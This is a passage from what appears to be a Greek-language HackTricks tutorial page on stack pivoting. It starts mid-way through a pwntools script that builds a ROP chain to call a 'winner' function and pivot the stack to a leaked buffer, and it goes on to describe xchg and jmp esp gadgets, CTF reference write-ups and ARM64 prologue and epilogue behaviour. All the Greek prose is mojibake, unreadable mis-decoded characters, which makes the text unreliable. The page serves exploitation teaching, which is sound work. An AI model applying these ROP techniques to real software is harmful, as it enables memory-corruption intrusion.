POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<reg>, rsp gadget
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

Î”ÎµÎ¯Ï„Îµ Ï„Î·Î½ Ï„ÎµÏ‡Î½Î¹ÎºÎ® ret2esp ÎµÎ´Ï:

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚ & Î†Î»Î»Î± Î Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î±

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
* [https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html)
* 64 bits, ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· off by one Î¼Îµ Î¼Î¹Î± Î±Î»Ï…ÏƒÎ¯Î´Î± rop Ï€Î¿Ï… Î¾ÎµÎºÎ¹Î½Î¬ Î¼Îµ Î­Î½Î± ret sled
* [https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html)
* 64 bit, Ï‡Ï‰ÏÎ¯Ï‚ relro, canary, nx ÎºÎ±Î¹ pie. Î¤Î¿ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Î¼Î¹Î± leak Î³Î¹Î± stack Î® pie ÎºÎ±Î¹ Î¼Î¹Î± WWW ÎµÎ½ÏŒÏ‚ qword. Î ÏÏÏ„Î± Ï€Î¬ÏÏ„Îµ Ï„Î·Î½ stack leak ÎºÎ±Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î·Î½ WWW Î³Î¹Î± Î½Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÏ„Îµ ÎºÎ±Î¹ Î½Î± Ï€Î¬ÏÎµÏ„Îµ Ï„Î·Î½ pie leak. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î·Î½ WWW Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î±Î½ Î±Î¹ÏÎ½Î¹Î¿ Î²ÏÏŒÏ‡Î¿ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Î¹ Ï„Î¹Ï‚ ÎµÎ³Î³ÏÎ±Ï†Î­Ï‚ `.fini_array` + ÎºÎ±Î»ÏÎ½Ï„Î±Ï‚ `__libc_csu_fini` ([Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎµÎ´Ï](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini\_array.md)). Î•ÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Î¹ Î±Ï…Ï„Î® Ï„Î·Î½ "Î±Î¹ÏÎ½Î¹Î±" ÎµÎ³Î³ÏÎ±Ï†Î®, Î³ÏÎ¬Ï†ÎµÏ„Î±Î¹ Î¼Î¹Î± Î±Î»Ï…ÏƒÎ¯Î´Î± ROP ÏƒÏ„Î¿ .bss ÎºÎ±Î¹ ÎºÎ±Ï„Î±Î»Î®Î³ÎµÎ¹ Î½Î± Ï„Î·Î½ ÎºÎ±Î»ÎµÎ¯ ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚ pivoting Î¼Îµ RBP.

## ARM64

Î£Ï„Î¿ ARM64, Î¿Î¹ **Ï€ÏÎ¿Î»ÏŒÎ³Î¿Î¹ ÎºÎ±Î¹ Î¿Î¹ ÎµÏ€Î¹Î»ÏŒÎ³Î¿Î¹** Ï„Ï‰Î½ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½ **Î´ÎµÎ½ Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Ï…Î½ ÎºÎ±Î¹ Î´ÎµÎ½ Î±Î½Î±ÎºÏ„Î¿ÏÎ½ Ï„Î¿ Î¼Î·Ï„ÏÏÎ¿ SP** ÏƒÏ„Î¿ stack. Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î· **ÎµÎ½Ï„Î¿Î»Î® `RET`** Î´ÎµÎ½ ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ ÏƒÏ„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï€Î¿Ï… Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ SP, Î±Î»Î»Î¬ **ÏƒÏ„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ `x30`**.

Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, Î±Ï€Î»Î¬ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Î¹ Ï„Î¿Î½ ÎµÏ€Î¯Î»Î¿Î³Î¿ **Î´ÎµÎ½ Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¿ Î¼Î·Ï„ÏÏÎ¿ SP** Î±Î½Ï„Î¹ÎºÎ±Î¸Î¹ÏƒÏ„ÏÎ½Ï„Î±Ï‚ ÎºÎ¬Ï€Î¿Î¹Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ stack. ÎšÎ±Î¹ Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Î±Î½ ÎºÎ±Ï„Î±Ï†Î­ÏÎµÏ„Îµ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¿ SP, Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯Ï„Îµ Î­Î½Î±Î½ Ï„ÏÏŒÏ€Î¿ Î½Î± **ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¿ Î¼Î·Ï„ÏÏÎ¿ `x30`**.

*   Ï€ÏÏŒÎ»Î¿Î³Î¿Ï‚

```armasm
sub sp, sp, 16
stp x29, x30, [sp]      // [sp] = x29; [sp + 8] = x30
mov x29, sp             // FP points to frame record
```
*   ÎµÏ€Î¯Î»Î¿Î³Î¿Ï‚

```armasm
ldp x29, x30, [sp]      // x29 = [sp]; x30 = [sp + 8]
add sp, sp, 16
ret
```

{% hint style="danger" %}
ÎŸ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎºÎ¬Ï„Î¹ Ï€Î±ÏÏŒÎ¼Î¿Î¹Î¿ Î¼Îµ Ï„Î¿ stack pivoting ÏƒÏ„Î¿ ARM64 Î¸Î± Î®Ï„Î±Î½ Î½Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¿ `SP`** (ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Ï‚ ÎºÎ¬Ï€Î¿Î¹Î¿ Î¼Î·Ï„ÏÏÎ¿ Ï„Î¿Ï… Î¿Ï€Î¿Î¯Î¿Ï… Î· Ï„Î¹Î¼Î® Î¼ÎµÏ„Î±Ï†Î­ÏÎµÏ„Î±Î¹ ÏƒÏ„Î¿ `SP` Î® ÎµÏ€ÎµÎ¹Î´Î® Î³Î¹Î± ÎºÎ¬Ï€Î¿Î¹Î¿ Î»ÏŒÎ³Î¿ Ï„Î¿ `SP` Ï€Î±Î¯ÏÎ½ÎµÎ¹ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ® Ï„Î¿Ï… Î±Ï€ÏŒ Ï„Î¿ stack ÎºÎ±Î¹ Î­Ï‡Î¿Ï…Î¼Îµ Î¼Î¹Î± Ï…Ï€ÎµÏÏ‡ÎµÎ¯Î»Î¹ÏƒÎ·) ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± **Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î¿Î½ ÎµÏ€Î¯Î»Î¿Î³Î¿** Î³Î¹Î± Î½Î± Ï†Î¿ÏÏ„ÏÏƒÎµÏ„Îµ Ï„Î¿ **Î¼Î·Ï„ÏÏÎ¿ `x30`** Î±Ï€ÏŒ Î­Î½Î± **ÎµÎ»ÎµÎ³Ï‡ÏŒÎ¼ÎµÎ½Î¿ `SP`** ÎºÎ±Î¹ **Î½Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÏ„Îµ** ÏƒÎµ Î±Ï…Ï„ÏŒ.
{% endhint %}

Î•Ï€Î¯ÏƒÎ·Ï‚, ÏƒÏ„Î·Î½ ÎµÏ€ÏŒÎ¼ÎµÎ½Î· ÏƒÎµÎ»Î¯Î´Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ Î¹ÏƒÎ¿Î´ÏÎ½Î±Î¼Î· Ï„Î¿Ï… **Ret2esp ÏƒÏ„Î¿ ARM64**:

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
